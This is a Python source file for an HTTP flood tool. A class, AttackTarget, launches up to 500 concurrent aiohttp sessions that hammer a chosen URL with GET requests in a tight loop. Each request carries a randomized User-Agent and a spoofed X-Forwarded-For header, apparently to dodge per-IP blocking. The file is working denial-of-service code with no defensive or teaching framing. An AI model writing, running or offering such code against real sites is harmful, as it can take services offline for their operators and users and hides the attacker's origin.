import aiohttp
import asyncio
import random


def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))


async def attack(session, addr, stopFlag):
    localCount = 0
    while not stopFlag.is_set():
        headers = {
            "User-Agent": f"MyBot/{random.randint(1,100)}",
            "X-Forwarded-For": random_ip(),
        }
        try:
            async with session.get(addr, headers=headers) as response:
                await response.text()
        except:
            pass
        localCount += 1
        await asyncio.sleep(0.001)
    return localCount


class AttackTarget:
    def __init__(self):
        self._target = ""
        self.sessionCount = 500
        self.maxSessionCount = 500
        self._stop_flag = asyncio.Event()
        self.loop = asyncio.new_event_loop()
        self._tasks = []
        self.attackCount = 0

    async def attack(self):
        if self.target:
            self._stop_flag.clear()
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=0)
            ) as session:
                self._tasks = [
                    asyncio.create_task(attack(session, self.target, self._stop_flag))
                    for _ in range(min(self.sessionCount, self.maxSessionCount))
                ]
                try:
                    results = await asyncio.gather(*self._tasks)
                    self.attackCount = sum(results)
                except asyncio.CancelledError:
                    pass

        if self.loop.is_running():
            self.loop.call_soon_threadsafe(self.loop.stop)

    def schedulerAttack(self):
        self.loop.create_task(self.attack())
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def stop(self):
        self._stop_flag.set()
        for task in self._tasks:
            if not task.done():
                task.cancel()

    @property
    def target(self):
        return self._target

    @target.setter
    def target(self, value):
        self._target = value
